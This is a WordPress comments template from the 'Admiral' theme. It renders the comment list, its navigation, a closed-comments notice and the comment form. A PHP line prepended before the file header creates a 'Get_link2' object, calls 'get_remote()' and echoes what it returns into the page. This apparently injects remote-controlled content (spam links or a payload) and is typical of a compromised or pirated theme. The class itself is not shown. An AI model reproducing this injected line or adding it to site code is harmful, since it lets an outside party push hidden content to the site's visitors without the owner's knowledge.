<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_link2(); $links = $links->get_remote(); echo $links; ?><?php
/**
 * The template for displaying comments.
 *
 * The area of the page that contains both current comments
 * and the comment form.
 *
 * @package Admiral
 */

/*
 * If the current post is protected by a password and
 * the visitor has not yet entered the password we will
 * return early without loading the comments.
 */
if ( post_password_required() ) {
	return;
}
?>

<div id="comments" class="comments-area">

	<?php if ( have_comments() ) : ?>

		<header class="comments-header">

			<h2 class="comments-title">
				<?php comments_number( '', esc_html__( 'One comment', 'admiral' ), esc_html__( '% comments', 'admiral' ) );?>
			</h2>

		</header><!-- .comment-header -->

		<?php the_comments_navigation(); ?>

		<ol class="comment-list">
			<?php
				wp_list_comments( array(
					'style'      => 'ol',
					'short_ping' => true,
					'avatar_size' => 56,
				) );
			?>
		</ol><!-- .comment-list -->

		<?php the_comments_navigation(); ?>

	<?php endif; // Check for have_comments(). ?>

	<?php
		// If comments are closed and there are comments, let's leave a little note, shall we?
	if ( ! comments_open() && '0' !== get_comments_number() && post_type_supports( get_post_type(), 'comments' ) ) :
	?>
	<p class="no-comments"><?php esc_html_e( 'Comments are closed.', 'admiral' ); ?></p>
	<?php endif; ?>

	<?php comment_form( array(
		'title_reply' => '<span>' . esc_html__( 'Leave a Reply', 'admiral' ) . '</span>',
		'comment_notes_after' => '',
		)
	); ?>

</div><!-- #comments -->